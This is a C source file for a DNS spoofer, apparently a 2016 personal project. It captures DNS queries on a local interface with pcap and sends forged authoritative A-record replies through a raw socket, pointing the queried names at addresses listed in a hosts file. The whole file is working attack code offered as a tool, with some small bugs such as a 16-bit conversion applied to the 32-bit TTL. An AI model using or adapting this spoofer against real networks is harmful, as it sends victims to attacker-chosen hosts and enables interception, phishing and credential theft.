/*
 * dns_spoofer.c
 *
 *  Created on: May 4, 2016
 *      Author: João Andreotti 
 */

#include <string.h>
#include <stdio.h>
#include <unistd.h>
#include <arpa/inet.h>

#include "header.h"
#include "net_utils.h"
#include "cap_utils.h"
#include "utils.h"

#define A_TYPE 1
#define BUFFER_SIZE 65536
#define DEF_TTL 3600
#define RESOLVER_BUFFER_SIZE 256
#define MAX_RESOLVER_ENTRIES 256

#define DEBUG

// Stores file descriptor to a Raw IP socket.
int raw_ip_socket = 0;

struct parsed_query;

char *parse_dns_name(char *name_str, char **end_of_name);

void handle_udp(const u_char *packet, const struct pcap_pkthdr *);

void answer_queries(struct iphdr *ip, struct udphdr *udp, struct dnshdr *dns,
                    struct parsed_query *queries);

struct resolver_entry;

u_int32_t resolve_address(char *name);
void load_resolver_entries(char *filename);

u_char *write_query(u_char *, struct parsed_query *);
u_char *write_response(u_char *, struct parsed_query *);

int main(int /*argc*/, char */*argv*/[])
{
    // Loads resolver table
    load_resolver_entries("hosts.txt"); 

    // Sets niceness to high priority
    if (nice(-20) == -1)
        printf("Could not set priority...\n");

    // Opens Raw-IP Socket
	raw_ip_socket = open_socket();

    // Opens interface for capture
    char dev_name[] = "enp0s31f6";
    pcap_t *handle = open_device(dev_name);

    // Applies filter to device
    apply_packet_filter(handle, "udp and port 53", dev_name);

    // Registers handler for UDP
    register_handler(UDP_PROT_NUMBER, handle_udp);

    // Initiates packet capture
    init_capture(handle);

    // Closes interface
    close_device(handle);
}

struct parsed_query {
    char *name;
    u_int16_t type;
    u_int16_t class;
    u_int32_t answer;
};

void handle_udp(const u_char *packet, const struct pcap_pkthdr *) {
#ifdef DEBUG
    tic();
#endif // DEBUG

    // Isolates headers
    struct iphdr *ip = (struct iphdr *) packet;
    struct udphdr *udp = (struct udphdr *) (packet + sizeof(struct iphdr));

    // Finds data
    char *data = (char *) (packet + sizeof(struct iphdr) + sizeof(struct udphdr));
    
    // Continues if DNS request, drops otherwise
    if (ntohs(udp->dest) != 53)
        return;

    // Parses DNS header
    struct dnshdr *dns = (struct dnshdr *) data;

    // Allocates space to store queries
    struct parsed_query query;

    // Prints all requested records
    char *curr_query = data + sizeof(struct dnshdr);
    query.name = parse_dns_name(curr_query, &curr_query);

    // reads type and class
    query.type = ntohs(*((u_int16_t *) curr_query));
    query.class = ntohs(*((u_int16_t *) (curr_query + sizeof(u_int16_t))));

    // prints query
    // printf("Query:\n\tName: %s\n\tType: %d\n\tClass: %d\n",
    //        query.name, query.type, query.class);

    // Answers queries
    answer_queries(ip, udp, dns, &query);

    // Frees memory
    free(query.name);
}

char *parse_dns_name(char *name_str, char **end_of_name) {
    unsigned char *name = (unsigned char *) name_str;

    // Allocates space to store string
    size_t curr_size = 0;
    char *parsed = malloc(curr_size);

    // Loops until empty label is found
    size_t iter = 0;
    while (*name != 0) {
        // Reallocates with correct size
        curr_size += *name + 1;
        parsed = realloc(parsed, curr_size);
        
        // Copies name to parsed string
        for (u_char i = 0; i < *name; i++)
            parsed[iter++] = name[i + 1];
        parsed[iter++] = '.';

        // Advances to next label
        name += *name + 1;
    }

    // Inserts null terminator
    parsed[curr_size - 1] = '\x00';

    // Saves end of name if provided
    if (end_of_name)
        *end_of_name = (char *) name + 1;

    return parsed; 
}


void answer_queries(struct iphdr *ip, struct udphdr *udp, struct dnshdr *dns,
                    struct parsed_query *query) {
    // Answers each query
    // Determines if we should respond to query
    if (query->type != A_TYPE) // Only answer A requests
        return;

    query->answer = resolve_address(query->name);
    if (query->answer == 0) // Don't answer if we don't want to change
        return;

    // Composes answer
    u_char dns_data[BUFFER_SIZE];
    struct dnshdr *new_dns = (struct dnshdr *) dns_data;
    
    *new_dns=*dns;
    new_dns->qcount = htons(1);
    new_dns->ancount = htons(1);
    new_dns->nscount = 0;
    new_dns->adcount = 0;

    new_dns->qr = 1; // is response
    new_dns->aa = 1; // is authoritative
    new_dns->ra = 0; // non recursive

    u_char *answer_iter = dns_data + sizeof(struct dnshdr);
    answer_iter = write_query(answer_iter, query);
    answer_iter = write_response(answer_iter, query);
    size_t answer_size = answer_iter - dns_data;

    // Answers
    char packet[BUFFER_SIZE];
    size_t tot_len = prepare_udp(
        packet, (char *) dns_data, answer_size,
        ip->daddr, ip->saddr,
        htons(udp->dest), htons(udp->source)
    );

    send_packet(raw_ip_socket, ip->saddr, packet, tot_len);
#ifdef DEBUG
    toc();
#endif // DEBUG
}

size_t num_resolver_entries = 0;
struct resolver_entry {
    char *name;
    uint32_t addr;
} resolver_entries[MAX_RESOLVER_ENTRIES];


u_int32_t resolve_address(char *name) {
    for (size_t i = 0; i < num_resolver_entries; i++) {
        if (strcmp(resolver_entries[i].name, name) == 0)
            return resolver_entries[i].addr;
    }

    return 0;
}

void load_resolver_entries(char *filename) {
    // Opens file
    FILE *fd = fopen(filename, "r");
    if (fd == NULL) {
        printf("Failed to open '%s' file.", filename);
        exit(-1);
    }

    // Reads addresses from file
    char line[RESOLVER_BUFFER_SIZE];
    while (fgets(line, RESOLVER_BUFFER_SIZE, fd)) {
        char *enter = strchr(line, '\n');
        if (enter) *enter = '\x00';

        char *sep = strchr(line, ' ');
        *sep = '\x00';

        char *name = malloc(strlen(sep + 1) + 1);
        strcpy(name, sep + 1);

        uint32_t addr = inet_addr(line);

        resolver_entries[num_resolver_entries].name = name;
        resolver_entries[num_resolver_entries++].addr = addr;

#ifdef DEBUG
        printf("New resolver entry: { .name = \"%s\", .addr = \"%s\" } \n", name, line);
#endif // DEBUG

    }

    // Closes file
    fclose(fd);
}

u_char *write_query(u_char *d, struct parsed_query *q) {
    // Writes name
    char *block_iter = q->name;
    do {
        u_char siz = 0;
        while (block_iter[siz] != '.' && block_iter[siz] != '\x00') siz++;

        *d++ = siz;
        memcpy(d, block_iter, siz);
        d += siz;

        block_iter += siz;
    } while (*block_iter++ != '\x00');

    *d++ = '\x00';

    // Writes type
    *((u_int16_t *) d) = htons(q->type);
    d += sizeof(u_int16_t);

    // Writes class
    *((u_int16_t *) d) = htons(q->class);
    d += sizeof(u_int16_t);

    return d;
}

u_char *write_response(u_char *d, struct parsed_query *q) {
    // Writes query
    d = write_query(d, q);

    // Writes ttl
    *((uint32_t *) d) = htons((uint32_t) DEF_TTL);
    d += sizeof(u_int32_t);

    // Writes rdlength
    *((u_int16_t *) d) = htons(4);
    d += sizeof(u_int16_t);

    // Writes answer IP
    *((u_int32_t *) d) = q->answer;
    d += sizeof(u_int32_t);

    return d;
}